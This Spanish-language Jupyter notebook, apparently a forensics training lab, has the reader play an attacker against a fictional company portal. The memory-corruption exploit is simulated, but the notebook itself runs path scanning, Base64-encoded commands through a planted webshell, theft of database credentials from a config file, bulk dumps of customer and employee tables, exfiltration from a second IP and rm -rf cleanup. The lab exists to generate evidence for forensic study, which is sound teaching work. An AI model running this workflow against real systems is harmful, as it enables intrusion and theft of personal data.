# 🎭 El ataque, paso a paso — «me meto a TechCorp»

En este notebook **usted hace de atacante**. Va a entrar al portal de TechCorp por la **página de subir la foto de perfil**, dejar una puerta trasera y llevarse la base de clientes y de empleados. Ejecute una celda a la vez (botón ▶ o `Shift + Enter`) y vaya explicando.

En cada paso el notebook responde tres preguntas:

| | Pregunta | Para qué |
|---|---|---|
| 🗡️ | **¿Qué hace el atacante?** | Entender la lógica del ataque |
| 🔬 | **¿Qué pasa de verdad en el laboratorio?** | Saber qué parte es **real** y qué parte es **simulada** (sin trucos escondidos) |
| 👣 | **¿Qué huella acabo de dejar?** | Ver, en los registros del servidor, lo que el forense va a encontrar después |

Cuando termine, abra **`analisis_forense.ipynb`**: ahí un ingeniero forense reconstruye TODO esto solo con las huellas que usted va a dejar.

## Antes de empezar: ¿qué es real y qué es simulado?

Este laboratorio **no usa ningún exploit real**. Sería peligroso y poco ético: PHP2Shell (CVE-2026-109618) es una falla real y grave. Pero casi todo lo demás **sí ocurre de verdad**:

| Pieza | ¿Real? | Qué pasa |
|---|---|---|
| Servidor web Apache, PHP 8.3.30 y MySQL 8.4 | ✅ Real | Imágenes oficiales, sin modificar |
| Las peticiones HTTP que usted manda | ✅ Real | Salen de este notebook y llegan al portal |
| Los registros (logs) del servidor | ✅ Real | El portal los escribe al atender cada petición |
| Las consultas a la base de datos del atacante | ✅ Real | MySQL las ejecuta con la cuenta robada; los datos son ficticios |
| Los archivos que se crean y se borran (`/tmp/.d/…`, `.tgz`) | ✅ Real | Existen de verdad en el disco del servidor mientras dura el ataque |
| **La corrupción de memoria de PHP2Shell** | 🎭 **Simulada** | Un *simulador* del portal reconoce el patrón del ataque y responde como un servidor vulnerable |
| **La ejecución de órdenes** en el servidor | 🎭 **Simulada a medias** | La puerta trasera solo acepta una **lista cerrada** de órdenes. Algunas devuelven un texto fijo y otras hacen el trabajo de verdad (se detalla en el paso 3) |
| La IP del atacante y la hora | 🎭 Simulada | Se fijan con dos cabeceras HTTP (se explica abajo) |

> Los datos (500 empleados y 2000 clientes) son inventados con Faker. Las IP del «atacante» son de rangos reservados para documentación (RFC 5737): no pertenecen a nadie.

## Preparación

### 🔬 Dos trucos del laboratorio (y por qué hacen falta)

**1. Elegir la IP de origen (`X-Forwarded-For`).** Todas las peticiones salen en realidad de este contenedor de Jupyter. Para que el portal las vea venir «desde Internet», mandamos la cabecera `X-Forwarded-For` con la IP que queremos. El portal confía en ella porque está configurado como si estuviera detrás de un **balanceador de carga**, que es lo normal en una empresa (Apache `mod_remoteip`). En un ataque real, la IP sería la del equipo del atacante, o la de un servidor alquilado o una VPN.

**2. Viajar en el tiempo (`X-Sim-Time`).** La semana de tráfico normal ya ocurrió «entre el 3 y el 9 de noviembre». Para que el ataque caiga **dentro** de esa semana, cada petición lleva la hora simulada en la cabecera `X-Sim-Time`, empezando el **viernes 6 de noviembre a la 01:52** (hora de Colombia). El portal anota esa hora en sus registros en lugar de la hora real. La función `pedir()` adelanta ese reloj unos segundos en cada paso, como si el atacante trabajara a ritmo humano.

### 👣 Cómo vamos a ver las huellas

El portal escribe sus registros en cuatro archivos, las mismas **cuatro «cámaras»** que usará el forense:

| Fuente | Archivo | Qué anota |
|---|---|---|
| Servidor web (Apache) | `web/access.jsonl` | Cada petición: IP, página, hora, código de respuesta, bytes |
| Aplicación (PHP) | `app/app.jsonl` | Inicios de sesión, errores y **caídas** del servidor |
| Base de datos (auditoría) | `db/audit.jsonl` | Cada consulta: con qué cuenta, qué tabla, cuántas filas |
| Integridad de archivos (FIM) | `fim/fim.jsonl` | Cada archivo que aparece o cambia en el servidor web |

Esta carpeta está montada en el notebook **en solo lectura**: miramos, pero no podemos tocar la evidencia. Antes de cada paso **marcamos dónde termina cada archivo**, y al final del paso leemos solo lo que se añadió. Así vemos exactamente qué escribió el servidor por culpa nuestra.

In [ ]:
import base64, io, json, os, re, time, warnings
from pathlib import Path
import requests
import pandas as pd
from IPython.display import display, Markdown
warnings.filterwarnings("ignore")      # oculta avisos técnicos para que la demo quede limpia
pd.set_option("display.max_colwidth", 90)

PORTAL = "http://portal"                      # el portal, visto desde este contenedor
IP_ATACANTE = "203.0.113.66"                  # desde aquí ataco
IP_EXFIL    = "203.0.113.67"                  # desde aquí me llevo los datos (otra máquina)
WEBSHELL    = "/uploads/avatars/thumb_8f3a.php"

# --- Truco 2: el "reloj" del laboratorio ------------------------------------------------
reloj = {"t": pd.Timestamp("2026-11-06T06:52:00Z")}   # 06:52 UTC = 01:52 hora de Colombia

def avanzar(segundos):
    reloj["t"] += pd.Timedelta(seconds=segundos)

def pedir(metodo, ruta, ip=IP_ATACANTE, ua="python-requests/2.32.3", avance=1.0, **kw):
    """Envía una petición REAL al portal, haciéndose pasar por 'ip' (truco 1) y con la hora simulada (truco 2)."""
    avanzar(avance)
    cab = {"Host": "portal.techcorp.local", "X-Forwarded-For": ip, "User-Agent": ua,
           "X-Sim-Time": reloj["t"].strftime("%Y-%m-%dT%H:%M:%S.") + f"{reloj['t'].microsecond // 1000:03d}Z"}
    return requests.request(metodo, PORTAL + ruta, headers=cab, allow_redirects=False, timeout=60, **kw)

# --- Las cuatro "cámaras": marcar dónde terminan y leer lo nuevo -------------------------
EVIDENCIA = Path(os.environ.get("EVIDENCIA", "/evidencia/logs"))
FUENTES = {"web": "web/access.jsonl", "app": "app/app.jsonl", "db": "db/audit.jsonl", "fim": "fim/fim.jsonl"}

def marcar():
    """Anota el tamaño actual de cada registro (lo que ya había antes de este paso)."""
    return {f: (EVIDENCIA / r).stat().st_size if (EVIDENCIA / r).exists() else 0 for f, r in FUENTES.items()}

def _json(linea):
    try:
        return json.loads(linea)
    except json.JSONDecodeError:          # Apache escapa algunos caracteres como \xHH (no es JSON válido)
        try:
            return json.loads(linea.replace("\\x", "\\u00"))
        except json.JSONDecodeError:
            return None

def huellas(marca):
    """Lee SOLO las líneas que cada registro ganó desde 'marca'. Devuelve una tabla por fuente."""
    time.sleep(0.5)                        # Apache escribe la línea justo después de responder
    tablas = {}
    for f, r in FUENTES.items():
        filas = []
        with open(EVIDENCIA / r, "rb") as fh:
            fh.seek(marca[f])
            for linea in fh:
                ev = _json(linea.decode("utf-8", "replace").strip())
                if ev:
                    filas.append(ev)
        df = pd.DataFrame(filas)
        if len(df):                        # hora de Colombia (UTC-5), la que verá el forense
            df.insert(0, "hora", (pd.to_datetime(df["ts"]) - pd.Timedelta(hours=5)).dt.strftime("%H:%M:%S"))
        tablas[f] = df
    return tablas

def resumen_huellas(h):
    display(pd.DataFrame([{"cámara": f, "líneas nuevas": len(df)} for f, df in h.items()]).set_index("cámara").T)

def tapar(texto):
    """No mostrar contraseñas en pantalla."""
    return re.sub(r"-p'[^']*'", "-p'********'", texto)

def estado_simulador():
    # Andamiaje del laboratorio: Apache NO lo anota en la evidencia (no ensucia los logs).
    return requests.get(PORTAL + "/_lab/estado.php", timeout=10).json()

# Dejamos el laboratorio listo para un ataque nuevo: borra la puerta trasera de una corrida
# anterior, pone en cero el contador del simulador y recorta los logs a la semana normal.
r = requests.get(PORTAL + "/_lab/reset.php?logs=1", timeout=30)   # logs=1: vuelve los logs a la semana normal
print("Laboratorio listo para el ataque:", r.json())
print("Estado del simulador:", estado_simulador())
MARCA_INICIAL = marcar()

**Resultado:** `reset.php` borró la puerta trasera de una corrida anterior (si la había) y el simulador quedó en cero (`'estado': None`). Esas dos direcciones (`/_lab/…`) son **andamiaje del laboratorio**: Apache está configurado para **no** anotarlas en la evidencia, así que no aparecerán en el análisis forense.

> 🔁 **Se puede repetir cuantas veces quiera.** Esta celda además devuelve los registros a como quedaron al terminar la semana normal (`logs_bytes_quitados`), así que el forense siempre verá **un solo ataque**: el que usted va a hacer ahora.

## Paso 1 · Reconocimiento — «¿qué páginas tiene esta empresa?»

🗡️ **¿Qué hace el atacante?** Primero **tantea puertas**: pide muchas direcciones a ver cuáles existen. Las herramientas como **gobuster** prueban listas de nombres típicos (`/admin`, `/backup`, `/.env`…). La mayoría no existen (código **404**), pero así descubre las que sí. Busca en especial una página que **reciba archivos**, porque ahí vive la falla de PHP.

🔬 **¿Qué pasa de verdad?** Todo es real: el portal busca cada ruta y responde 404, 302 o 200 según exista o no. Lo único simulado es la IP y la hora (los dos trucos). Usamos el mismo *User-Agent* que gobuster (`gobuster/3.6`), la «firma» con la que se presenta la herramienta.

In [ ]:
marca = marcar()

# Pido muchas rutas típicas (como la herramienta "gobuster"). Casi todas darán 404.
rutas_tanteo = [f"/{p}" for p in ["admin", "backup", "config.php", "phpmyadmin", "test", ".env", "old",
    "panel", "db.sql", "server-status", "wp-login.php", "shell.php", "uploads", "api", "login",
    "dev", "staging", ".git/config", "secret", "data.zip"]] * 3        # ~60 intentos rápidos
encontradas = []
for ruta in rutas_tanteo:
    resp = pedir("GET", ruta, ua="gobuster/3.6", avance=0.1)
    if resp.status_code != 404:
        encontradas.append({"ruta": ruta, "código": resp.status_code, "a dónde manda": resp.headers.get("Location", "")})

# Y pruebo la página de subir la foto de perfil
foto = pedir("GET", "/empleados/foto.php", ua="gobuster/3.6")
encontradas.append({"ruta": "/empleados/foto.php", "código": foto.status_code, "a dónde manda": foto.headers.get("Location", "")})

print(f"Probé {len(rutas_tanteo) + 1} direcciones. Las que SÍ respondieron algo distinto de 404:")
display(pd.DataFrame(encontradas).drop_duplicates())
print("Cabecera que delata la versión de PHP:", foto.headers.get("X-Powered-By"))

**¿Qué encontré?**

* `/config.php` y `/server-status` responden **403** («prohibido»): existen, pero no me dejan verlas. `/uploads` y `/api` responden **301**: son carpetas. Ya sé que hay una carpeta de **subidas**.
* **`/empleados/foto.php` existe**: responde **302**, es decir, «primero inicie sesión» y me manda a `/login.php`. Es la página para subir la foto de perfil, una **subida de archivos**, justo donde vive la falla.
* El servidor **delata su versión** en la cabecera `X-Powered-By: PHP/8.3.30` (mala práctica: `expose_php = On`). La 8.3.30 es **anterior al parche** (8.3.36). Ya sé que es vulnerable.
* Que la página pida iniciar sesión **no me detiene**: PHP2Shell se dispara cuando PHP *recibe* el archivo, **antes** de que el código del portal revise si hay sesión. Lo comprobamos en el paso 2.

In [ ]:
h = huellas(marca)
resumen_huellas(h)
web = h["web"]
print("\nAsí quedaron mis peticiones en el registro del servidor web (las primeras y la última):")
cols = ["hora", "client_ip", "method", "uri", "status", "user_agent"]
display(pd.concat([web[cols].head(5), web[cols].tail(1)]))
print("Códigos de respuesta:", web["status"].value_counts().to_dict())

👣 **La huella:** unas 60 líneas en el registro web, **casi todas 404**, desde la misma IP, en **unos pocos segundos** y con el *User-Agent* `gobuster/3.6`. Ningún empleado pide 60 páginas inexistentes en segundos. La aplicación también anotó cada página inexistente (`not_found`) o prohibida (`forbidden`). La base de datos y el FIM no anotaron nada: tantear no toca datos ni crea archivos.

➡️ En el forense: **sección 4.3** (*Ráfagas de páginas inexistentes*).

## Paso 2 · El ataque — «subo archivos hasta colar una puerta trasera»

🗡️ **¿Qué hace el atacante?** Le manda a la página de la foto, una y otra vez, un **archivo enorme** junto con el campo `PHP_SESSION_UPLOAD_PROGRESS` (el que activa la función de «progreso de subida» de PHP, donde está la falla). En el ataque real:

1. Cada intento intenta dejar la memoria del proceso de PHP en un estado concreto (***use-after-free***: usar memoria que ya se devolvió).
2. Como el atacante **no sabe** cómo está organizada la memoria del servidor, casi siempre falla: el proceso de Apache **se cae** (*Segmentation fault*) y la víctima responde **error 500**.
3. Repite hasta que un intento acierta. Ahí consigue **ejecutar código**, y lo primero que hace es **escribir una puerta trasera** (*webshell*): un archivo `.php` en una carpeta pública desde la que luego dará órdenes.

🔬 **¿Qué pasa de verdad en el laboratorio? (aquí está la simulación)**

**El contenido del archivo NO importa: son solo ceros.** No construimos ningún archivo malicioso (eso sí sería un manual de ataque). Lo que hace el ataque «funcionar» es un **simulador** que el portal ejecuta **antes que cualquier página** (`portal/lab/simulador_php2shell.php`, cargado con `auto_prepend_file`). Esto es exactamente lo que hace, sin magia:

| Si la petición… | El simulador… |
|---|---|
| no es un `POST` con archivo **y** con el campo `PHP_SESSION_UPLOAD_PROGRESS` | no hace nada (los empleados normales nunca mandan ese campo) |
| sí lo es | suma **1 intento** a un contador interno |
| y el contador va por debajo de **19** (`LAB_EXPLOIT_ATTEMPTS`) | anota en el log de la aplicación una caída `AH00052: … Segmentation fault (11)` y responde **500** |
| y el contador llega a **19** | **escribe un archivo real**, `/uploads/avatars/thumb_8f3a.php` (la webshell), y el monitor de integridad (FIM) lo registra con su huella SHA-256 |

O sea: el **19** es un número fijo del laboratorio que imita la parte de «suerte» del exploit real. Lo que sí es igual que en la realidad es la **huella**: subidas enormes, sin sesión, contra una página que recibe archivos, con caídas del servidor y un archivo `.php` nuevo donde solo debería haber fotos.

Después de cada intento pido la dirección de la webshell para ver si ya existe. Eso también es real: Apache responde **404** mientras el archivo no está y **200** cuando aparece.

In [ ]:
marca = marcar()
print("Contador del simulador ANTES:", estado_simulador())

intentos = []
puerta_lista = False
for n in range(1, 30):
    # Relleno de ceros: el CONTENIDO da igual en el laboratorio. Solo importan el campo
    # PHP_SESSION_UPLOAD_PROGRESS y que sea una subida de archivo. El tamaño (~400-700 KB)
    # varía en cada intento para que la huella se parezca a la de un exploit real.
    relleno = b"\x00" * (400_000 + n * 15_000)
    resp = pedir("POST", "/empleados/foto.php", avance=2.0,
                 data={"PHP_SESSION_UPLOAD_PROGRESS": "x" * 48},
                 files={"foto": ("perfil.jpg", io.BytesIO(relleno), "image/jpeg")},
                 cookies={"PHPSESSID": f"sesion{n:03d}"})       # el progreso de subida se guarda en la sesión
    # ¿Ya quedó instalada la puerta trasera?
    chk = pedir("GET", WEBSHELL, avance=0.5)
    puerta_lista = chk.status_code == 200
    intentos.append({"intento": n, "tamaño_enviado_KB": len(relleno) // 1024,
                     "respuesta_subida": resp.status_code,
                     "¿existe la webshell?": chk.status_code,
                     "qué pasó": "✅ ¡PUERTA TRASERA INSTALADA!" if puerta_lista
                                 else "💥 proceso caído (500)" if resp.status_code == 500 else "—"})
    if puerta_lista:
        break
    avanzar(10)

display(pd.DataFrame(intentos).set_index("intento"))
print("Contador del simulador DESPUÉS:", estado_simulador())

**¿Qué pasó?**

* **18 intentos fallidos** (500): el simulador «tumbó» el proceso cada vez. Fíjese en que **nunca** respondió 302 («inicie sesión»): el «fallo» ocurre **antes** de que la página `foto.php` llegue a revisar la sesión. Esa es la parte grave de PHP2Shell: **no hace falta usuario ni contraseña**.
* **En el intento 19 el contador llegó a la meta** y el simulador escribió la webshell. Esa vez el proceso **no** se cayó: la petición siguió su curso hasta `foto.php`, que respondió **302** («inicie sesión»). Al atacante le da igual: la puerta trasera ya está puesta.
* Justo después, `GET /uploads/avatars/thumb_8f3a.php` pasó de **404 a 200**: el archivo existe y Apache lo ejecuta como PHP, porque la carpeta de fotos **permite ejecutar PHP** (otra mala práctica intencional del escenario).

🔬 **¿Qué hay dentro de la webshell?** Es un archivo de 4 líneas que **no ejecuta nada en el sistema**: solo llama al simulador de órdenes del laboratorio (`portal/lab/webshell_simulada.php`). Una webshell real tendría una línea que pasa la orden recibida al sistema operativo. Para el forense no hay diferencia: lo que ve es un `.php` que **no debería existir** en una carpeta de fotos.

In [ ]:
h = huellas(marca)
resumen_huellas(h)
web, app, fim = h["web"], h["app"], h["fim"]

print("\n1) Servidor web: mis subidas a la página de la foto (enormes y sin sesión)")
subidas = web[(web["method"] == "POST") & (web["uri"] == "/empleados/foto.php")]
display(subidas[["hora", "client_ip", "uri", "status", "bytes_received", "user"]].head(4))
print("   ...", len(subidas), "subidas en total ·", subidas["status"].value_counts().to_dict(),
      "· tamaño medio:", f"{subidas['bytes_received'].mean() / 1024:,.0f} KB (una foto normal pesa ~50 KB)")

print("\n2) Aplicación: las caídas del servidor (fíjese: no dicen qué IP ni qué petición las causó)")
caidas = app[app["event"] == "child_crash"]
display(caidas[["hora", "level", "event", "message", "client_ip", "request_id"]].head(3))
print("   ...", len(caidas), "caídas en total")

print("\n3) Monitor de integridad (FIM): aparece un archivo .php en la carpeta de fotos")
display(fim[["hora", "event", "path", "size", "owner", "sha256"]])

👣 **La huella:** tres cámaras distintas vieron tres cosas distintas del mismo hecho:

1. **Servidor web**: 19 subidas de 400–700 KB a `/empleados/foto.php`, **sin usuario** (`user = -`), 18 con error 500.
2. **Aplicación**: 18 caídas `AH00052 Segmentation fault`. Ojo: **no dicen qué IP las provocó** (un proceso que se cae no alcanza a anotarlo). El forense tendrá que unirlas con las subidas **por la hora**.
3. **FIM**: `file_added` de `thumb_8f3a.php`, con su huella SHA-256, creado por el proceso `apache2`.

Hay una pista más, sutil: las 18 veces que pregunté por la webshell **antes** de que existiera quedaron como **404** en el servidor web (y `not_found` en la aplicación). El atacante estaba **preguntando por un archivo que todavía no existía**: sabía que iba a aparecer.

➡️ En el forense: **5.1** (subidas anómalas), **5.2** (unir subidas y caídas por la hora, un *ASOF JOIN*) y **5.3** (el archivo nuevo).

## Paso 3 · Ya estoy adentro — «¿quién soy y qué hay en la base de datos?»

🗡️ **¿Qué hace el atacante?** La webshell le deja mandar **órdenes** al servidor escribiéndolas en la dirección (URL), en el parámetro `x`, **codificadas en Base64** para que no se lean a simple vista ni las detecten filtros sencillos. Primero pregunta **quién es** en el servidor, luego lee el **archivo de configuración**, donde por mala práctica está escrita la contraseña de la cuenta de mantenimiento de la base de datos, y con esa contraseña **se asoma a la base de clientes**.

🔬 **¿Qué pasa de verdad?** La webshell del laboratorio solo entiende una **lista cerrada** de órdenes (cualquier otra responde `not found`). Esta es la tabla completa, sin trampas:

| Orden | ¿Qué hace en el laboratorio? |
|---|---|
| `id`, `whoami`, `hostname`, `pwd`, `uname -a` | 🎭 Devuelve un **texto escrito de antemano** (parecido al que daría un servidor real) |
| `php -v` | 🎭 Texto fijo, pero con la **versión real** de PHP del contenedor |
| `cat /var/www/html/config/database.php` | ✅ **Lee el archivo real** con las contraseñas (lo genera el portal al arrancar) |
| `mysql -u USUARIO -p'CLAVE' techcorp -e "SELECT …"` | ✅ **Consulta real a MySQL** con la cuenta y la clave que usted le pase (solo unos `SELECT` fijos; nunca SQL libre). Si la clave está mal, MySQL la rechaza de verdad |
| `mkdir`, `tar czf`, `rm -rf` sobre `/tmp/.d…` | ✅ Crea, empaqueta y borra **archivos reales** en el servidor |
| `ls -la` / `du -sh` (carpetas permitidas) | ✅ Lista o mide archivos reales |
| `?dl=` (descarga) | ✅ Descarga **de verdad** un archivo de `/tmp` |

Así, aunque no hay una consola real, **todo lo que toca datos es real**: la contraseña se lee del archivo, MySQL comprueba esa contraseña y devuelve filas de verdad, y la auditoría de la base de datos anota cada consulta.

In [ ]:
marca = marcar()

def orden(texto, ip=IP_ATACANTE, ua="python-requests/2.32.3"):
    """Le mando una orden a la puerta trasera, codificada en Base64 (el log la guarda igual)."""
    cmd = base64.b64encode(texto.encode()).decode()
    return pedir("GET", f"{WEBSHELL}?x={cmd}", ip=ip, ua=ua, avance=15).text

print("Así viaja una orden por la URL:  id  →  ?x=" + base64.b64encode(b"id").decode())
print()
print("¿Quién soy en el servidor?  →", orden("id").strip())
print("¿Qué versión de PHP?        →", orden("php -v").splitlines()[0])

# Leo el archivo de configuración y saco la contraseña del administrador de la base de datos
config = orden("cat /var/www/html/config/database.php")
usuario, clave = re.search(r"'admin'\s*=>\s*\['user' => '([^']+)', 'pass' => '([^']*)'\]", config).groups()
print("\nEl archivo de configuración (contraseñas tapadas en pantalla):")
print(re.sub(r"'pass' => '[^']*'", "'pass' => '********'", config))
print(f"🔑 Encontré la cuenta de mantenimiento de la base de datos: {usuario}")

**¿Qué encontré?**

* Soy `www-data`, el usuario con el que corre el servidor web. No soy administrador del sistema, pero puedo leer lo que lee el portal.
* El archivo `config/database.php` tiene **dos cuentas**: `techcorp_app` (la que usa el portal, con permisos mínimos) y **`techcorp_admin`**, una cuenta de mantenimiento con **todos los privilegios**, olvidada desde 2023 («TODO: retirar»). Me quedo con esa.

In [ ]:
# Con esa cuenta pido los primeros 10 clientes, para mostrar que de verdad tengo los datos
mysql = f"mysql -h db -u {usuario} -p'{clave}' techcorp -e"
tsv = orden(f'{mysql} "SELECT * FROM clientes ORDER BY id LIMIT 10 OFFSET 0"')
clientes = pd.read_csv(io.StringIO(tsv), sep="\t")

print("Una muestra de los datos de clientes que ya puedo ver (documento, correo, teléfono, saldo…):\n")
display(clientes[["id", "tipo_documento", "numero_documento", "nombres", "apellidos", "correo", "ciudad", "saldo"]]
        if "numero_documento" in clientes else clientes.head(10))

Estos datos **salieron de MySQL de verdad**: la webshell abrió una conexión con `techcorp_admin` y la clave robada, y MySQL devolvió las filas (son ficticias). Veamos cómo quedó todo esto registrado.

In [ ]:
h = huellas(marca)
resumen_huellas(h)
web, db = h["web"], h["db"]

print("\n1) Servidor web: cada orden quedó escrita en la URL (en Base64). La decodificamos:")
ordenes = web[web["uri"] == WEBSHELL].copy()
ordenes["orden decodificada"] = ordenes["query"].str.replace("?x=", "", regex=False).map(
    lambda q: tapar(base64.b64decode(q).decode("utf-8", "replace")))
display(ordenes[["hora", "client_ip", "query", "orden decodificada", "status"]])

print("\n2) Auditoría de la base de datos: la consulta, con la CUENTA usada y el request_id de la petición web")
display(db[["hora", "db_user", "client_host", "tables", "rows_sent", "sqltext"]])

👣 **La huella:**

1. **Servidor web**: cada orden está **en la URL**. Base64 no es cifrado: se decodifica sin ninguna clave. El atacante escondió las órdenes de la vista, pero no del registro.
2. **Auditoría de BD**: la consulta la hizo **`techcorp_admin`**, una cuenta que el portal normal **nunca** usa, y el texto SQL lleva un comentario con el **`request_id`** de la petición web que la provocó (técnica *sqlcommenter*) y la ruta, **`/uploads/avatars/thumb_8f3a.php`**. Ese identificador **une las dos cámaras**: esta fila de la base de datos la pidió esa visita a la webshell, desde esa IP, a esa hora.

➡️ En el forense: **6** (decodificar las órdenes y mapearlas a MITRE ATT&CK) y **7** (unir web y base de datos por `request_id`).

## Paso 4 · El robo — «me llevo TODA la base y borro mis huellas»

🗡️ **¿Qué hace el atacante?** Ahora va en serio:

1. Crea una carpeta **oculta** (`/tmp/.d`; en Linux, un nombre que empieza por punto no aparece en un `ls` normal).
2. **Vuelca** las 2000 filas de clientes (en 4 bloques de 500, para no levantar sospechas con una sola consulta gigante) y los 500 empleados (con **salarios y hashes de contraseñas**).
3. **Empaqueta** todo en un `.tgz` y, de paso, una copia del **código del portal** (para buscar más fallas después).
4. Lo **descarga desde otra máquina** (otra IP y otra herramienta, `curl`), para que quien bloquee la primera IP no corte el robo.
5. **Borra** los archivos temporales (antiforense) y deja la webshell para volver otro día.

🔬 **¿Qué pasa de verdad?** Todo lo de este paso ocurre de verdad dentro del servidor: MySQL devuelve las 2500 filas, los archivos `.tsv` y `.tgz` se escriben en `/tmp` del contenedor, la descarga transfiere los bytes reales, y `rm` los borra. Lo único simulado sigue siendo que las órdenes pasan por la lista cerrada de la webshell.

In [ ]:
marca = marcar()

orden("mkdir -p /tmp/.d")
for off in range(0, 2000, 500):                        # las 2000 filas, en 4 bloques
    orden(f'{mysql} "SELECT * FROM clientes ORDER BY id LIMIT 500 OFFSET {off}" > /tmp/.d/clientes_{off//500}.tsv')
orden(f'{mysql} "SELECT * FROM empleados ORDER BY id" > /tmp/.d/empleados.tsv')   # incluye salarios y contraseñas
orden("tar czf /tmp/.d.tgz -C /tmp .d")                # empaqueto la base de datos robada
orden("tar czf /tmp/.w.tgz /var/www/html")             # y también una copia del código del portal

# Me lo descargo DESDE OTRA MÁQUINA (otra IP). Por eso un forense no debe fijarse solo en una IP.
descargas, paquetes = [], {}
for archivo in ("/tmp/.d.tgz", "/tmp/.w.tgz"):
    avanzar(40)
    robo = pedir("GET", f"{WEBSHELL}?dl={base64.b64encode(archivo.encode()).decode()}", ip=IP_EXFIL, ua="curl/8.5.0", avance=1)
    paquetes[archivo] = robo.content
    descargas.append({"archivo": archivo, "desde la IP": IP_EXFIL, "bytes recibidos": len(robo.content),
                      "MB": round(len(robo.content) / 1_048_576, 2)})
display(pd.DataFrame(descargas))
total = sum(d["bytes recibidos"] for d in descargas)
print(f"📦 Me llevé {total/1_048_576:.1f} MB (clientes, empleados y el código del portal).")

orden("rm -rf /tmp/.d /tmp/.d.tgz /tmp/.w.tgz")         # borro mis huellas en /tmp
print("🧹 Borré los archivos temporales. En el servidor ya no queda nada del robo... salvo la webshell.")

¿De verdad me llevé los datos? Abro en «mi máquina» el paquete que descargué. En el servidor ya no existe (lo borré), pero yo tengo la copia:

In [ ]:
import tarfile
contenido = []
with tarfile.open(fileobj=io.BytesIO(paquetes["/tmp/.d.tgz"]), mode="r:gz") as tgz:
    for m in tgz.getmembers():
        if m.isfile():
            texto = tgz.extractfile(m).read().decode("utf-8", "replace")
            contenido.append({"archivo": m.name, "KB": round(m.size / 1024, 1),
                              "registros": texto.count("\n") - 1,          # menos la fila de títulos
                              "columnas": texto.split("\n", 1)[0].replace("\t", ", ")[:80] + "…"})
display(pd.DataFrame(contenido).sort_values("archivo"))

with tarfile.open(fileobj=io.BytesIO(paquetes["/tmp/.w.tgz"]), mode="r:gz") as tgz:
    nombres = tgz.getnames()
print(f"Y el código del portal: {len(nombres)} archivos. ¿Incluye el archivo con las contraseñas?",
      any(n.endswith("config/database.php") for n in nombres))

In [ ]:
h = huellas(marca)
resumen_huellas(h)
web, db = h["web"], h["db"]

print("\n1) Servidor web: las órdenes del robo y las DESCARGAS desde la otra IP (mire bytes_sent)")
w = web[web["uri"] == WEBSHELL].copy()
def decodificar(q):
    clave, valor = q.lstrip("?").split("=", 1)
    texto = tapar(base64.b64decode(valor).decode("utf-8", "replace"))
    return ("descarga: " if clave == "dl" else "") + texto
w["orden decodificada"] = w["query"].map(decodificar)
display(w[["hora", "client_ip", "user_agent", "orden decodificada", "bytes_sent"]])

print("\n2) Auditoría de BD: qué cuenta leyó qué tabla y cuántas filas")
display(db.groupby(["db_user", db["tables"].map(lambda t: ",".join(t))])["rows_sent"]
          .agg(consultas="count", filas="sum").rename_axis(["cuenta", "tabla"]))
print("La auditoría guarda incluso QUÉ filas (row_ids) devolvió cada consulta. Primeras 10 del primer bloque:",
      db["row_ids"].iloc[0][:10] if "row_ids" in db and len(db) else "—")

👣 **La huella:**

1. **Servidor web**: las órdenes `mkdir`, `mysql … > /tmp/.d/…`, `tar` y `rm` en la URL, y sobre todo **dos respuestas enormes** (de varios MB, cuando una orden normal devuelve unos cientos de bytes) hacia **otra IP**, `203.0.113.67`, con `curl`. Si el forense solo hubiera buscado la primera IP, **no habría visto el robo**: hay que seguir el **artefacto** (la webshell), no solo la IP.
2. **Auditoría de BD**: `techcorp_admin` leyó **2000 filas de `clientes`** y **500 de `empleados`**, con la lista exacta de qué registros (`row_ids`). Así se sabe **a quiénes** afectó, persona por persona, lo que exige la Ley 1581 de 2012 para avisar a los titulares.
3. **El borrado** (`rm -rf`) también quedó escrito. Los archivos ya no existen, pero sabemos cuándo se crearon, qué tenían, cuánto pesaban y cuándo se borraron. Ese es el **principio de Locard**: *todo contacto deja un rastro*.

➡️ En el forense: **6.1** (lo que se borró), **7.1–7.3** (registros exactos y su gravedad) y **8** (exfiltración).

## Fin del ataque 🏁 — ¿qué dejé en total?

In [ ]:
h = huellas(MARCA_INICIAL)
total_lineas = sum(len(df) for df in h.values())
web = h["web"]
ini, fin = pd.to_datetime(web["ts"].iloc[0]), pd.to_datetime(web["ts"].iloc[-1])
print(f"Ataque de {web['hora'].iloc[0]} a {web['hora'].iloc[-1]} (hora de Colombia, viernes 6 de noviembre): "
      f"{(fin - ini).total_seconds() / 60:.1f} minutos simulados")
print(f"Dejé {total_lineas} líneas de evidencia repartidas así:")
resumen_huellas(h)
print("IP que usé:", web["client_ip"].value_counts().to_dict())
print("Herramientas (User-Agent):", web["user_agent"].value_counts().to_dict())
print(f"Bytes que salieron del servidor hacia mí: {web['bytes_sent'].sum() / 1_048_576:.1f} MB")

En **menos de 10 minutos simulados** entré sin usuario ni contraseña, dejé una puerta trasera, robé la base de clientes y empleados, y borré los archivos temporales. **La empresa no se dio cuenta** (nadie miraba los registros). Pero cada paso dejó huella en al menos una de las cuatro cámaras:

| Paso | Técnica (MITRE ATT&CK) | Huella principal | ¿Dónde la encuentra el forense? |
|---|---|---|---|
| 1. Reconocimiento | T1595 Escaneo activo | Ráfaga de 404 con `gobuster/3.6` | 4.3 |
| 2. Explotación | T1190 Explotar una aplicación expuesta | Subidas enormes sin sesión + 500 + caídas `AH00052` | 5.1, 5.2 |
| 2. Puerta trasera | T1505.003 Webshell | `file_added` de `thumb_8f3a.php` en el FIM | 5.3 |
| 3. Descubrimiento | T1082 Información del sistema | Órdenes en Base64 en la URL | 6 |
| 3. Robo de credenciales | T1552.001 Credenciales en archivos | `cat config/database.php` | 6 |
| 3–4. Uso de la cuenta robada | T1078 Cuentas válidas | `techcorp_admin` en la auditoría de BD | 7 |
| 4. Volcado y preparación | T1005, T1074.001 | `SELECT *` en bloques de 500 hacia `/tmp/.d` | 6.1, 7.1 |
| 4. Compresión | T1560.001 | `tar czf` | 6.1 |
| 4. Exfiltración | T1041 Por el canal de la webshell | Respuestas de varios MB hacia `203.0.113.67` | 8 |
| 4. Limpieza | T1070.004 Borrado de archivos | `rm -rf /tmp/.d …` | 6.1 |

### En resumen: qué fue real y qué fue simulado

* 🎭 **Simulado**: la corrupción de memoria (un contador que «acierta» al intento 19), las respuestas de las órdenes de sistema (`id`, `uname`…), la IP de origen y la hora.
* ✅ **Real**: cada petición HTTP, cada línea de log, la lectura del archivo de contraseñas, las consultas a MySQL con la cuenta robada, los archivos creados y borrados, y los MB descargados.

Por eso el análisis forense que sigue es **auténtico**: trabaja sobre las mismas huellas que habría dejado el ataque real.

